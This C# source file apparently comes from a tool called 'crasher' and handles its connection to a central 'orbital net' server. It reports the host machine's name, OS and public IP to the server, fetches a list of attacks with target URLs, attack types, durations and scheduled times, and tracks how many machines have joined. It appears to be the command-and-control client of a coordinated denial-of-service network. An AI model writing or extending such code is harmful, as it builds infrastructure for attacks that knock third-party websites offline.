using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using crasher.Model;

namespace crasher.Helpers
{

    public static class MREHelper
    {
        private static WebClient Client = ApplicationWebClient.Client;

        #region Api Features
        public static JArray JoinMRE()
        {
            //USAGE = adduser.php?name=<name>&os=<os>
            string hostname = Environment.MachineName;
            string architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86";
            string os = Environment.OSVersion + " " + architecture;
            string ip = ClientHelper.GetPublicIpAddress();

            Uri uri = new Uri(ServerInfo.Server_Function_Path + "adduser.php?name=" + hostname + "&os=" + os + "&ip=" + ip);
            try
            {
                Console.WriteLine(uri);
                var json = Client.DownloadString(uri);

                Console.WriteLine(json.ToString());
                return JArray.Parse(json);
            }
            catch (WebException ex)
            {
                throw new WebException("Cannot contact orbital net " + ex.Message +" "+ ServerInfo.Server_Function_Path);
            }

        }

        public static JArray LeftMRE()
        {
            //USAGE = removeuser.php
            string ip = ClientHelper.GetPublicIpAddress();
            var json = Client.DownloadString(ServerInfo.Server_Root + "/" + "@/function/removeuser.php?ip=" + ip);
            return JArray.Parse(json);
        }

        public static JArray GetUserAttacks()
        {
            var json = Client.DownloadString(ServerInfo.Server_Function_Path + "getuserattacks.php");
            return JArray.Parse(json);
        }

        public static int GetTotUsers()
        {
            try
            {
                int users = Convert.ToInt32(Client.DownloadString(ServerInfo.Server_Function_Path + "getTotUser.php"));
                return users;
            }
            catch
            {
                return -1;
            }
        }


        #endregion

        #region Json Converters & Formatters
        public static List<IDictionary<string, object>> FormatUserAttacks()
        {
            JArray attacks = GetUserAttacks();
            List<IDictionary<string, object>> attackList = new List<IDictionary<string, object>>();

            IDictionary<string, object> dictionary;
            for (int i = 0; i < attacks.Count; i++)
            {
                dictionary = new Dictionary<string, object>();
                dictionary["id"] = GetJsonInt(attacks, "id", i);
                dictionary["url"] = GetJsonString(attacks, "url", i);
                dictionary["attackType"] = GetJsonString(attacks, "attackType", i);
                dictionary["time"] = GetJsonInt(attacks, "time", i);
                dictionary["planningEnabled"] = GetJsonBool(attacks, "planningEnabled", i);

                if (Convert.ToBoolean(dictionary["planningEnabled"]))
                {
                    dictionary["planningDate"] = GetJsonString(attacks, "planningDate", i);
                    dictionary["planningTime"] = GetJsonString(attacks, "planningTime", i);
                }

                attackList.Add(dictionary);
            }

            return attackList;
        }

        public static bool JsonGetStatus(JArray json)
        {
            var result = GetJsonString(json, "status", json.Count - 1);
            return result == "success" ? true : false;
        }

        public static string JsonGetMessage(JArray json)
        {
            var mess = GetJsonString(json, "message", json.Count - 1);
            return mess;
        }

        public static string GetJsonString(JArray json, string dataIndex, int arrayIndex)
        {
            var jsonString = json[arrayIndex][dataIndex];
            return jsonString.Value<string>();
        }

        public static int GetJsonInt(JArray json, string dataIndex, int arrayIndex)
        {
            var jsonString = json[arrayIndex][dataIndex];
            return jsonString.Value<int>();
        }

        public static bool GetJsonBool(JArray json, string dataIndex, int arrayIndex)
        {
            var jsonString = json[arrayIndex][dataIndex];
            return jsonString.Value<bool>();
        }

        //TODO: FIX
        public static T GetJsonData<T>(JArray json, string dataIndex, int arrayIndex) where T : IConvertible
        {
            var jsonString = json[arrayIndex][dataIndex];
            return (T)Convert.ChangeType(jsonString.Value<int>(), typeof(T));
        }
        #endregion
    }
}
